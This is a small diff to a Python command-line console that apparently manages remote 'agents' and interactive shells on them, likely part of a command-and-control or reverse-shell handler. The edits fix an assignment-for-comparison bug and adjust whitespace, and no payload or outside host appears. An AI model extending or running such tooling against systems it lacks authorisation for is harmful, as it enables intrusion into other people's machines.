@@ -79,7 +79,7 @@ class Terminal(Cmd):
             print("[DBG] Getting new connection queue...")
             # Parsing last agent ID
             self.agent = list(self.ClientDict.keys())[-1]
-
+            
             # TODO - IMPLEMENT VERIFICATION IF SAME IP? ONLY THEN ASSIGN QUEUE?
             print("[DBG] Shell Agent ID: {} and data:".format(self.agent))
             print("{}".format(self.ClientDict[self.agent]))
@@ -87,7 +87,7 @@ class Terminal(Cmd):
             self.prompt = '{} shell> '.format(self.ClientDict[self.agent][0][0])
             
     def do_back(self,args):
-        if self.shell = True:
+        if self.shell == True:
             self.q.put("exit\n")
             self.do_interact(self.parentagent)
         else:
@@ -95,7 +95,7 @@ class Terminal(Cmd):
             self.prompt = '$ '
 
     def do_exit(self,args):
-        if self.shell = True:
+        if self.shell == True:
             self.q.put("exit\n")
             self.do_interact(self.parentagent)
         else:
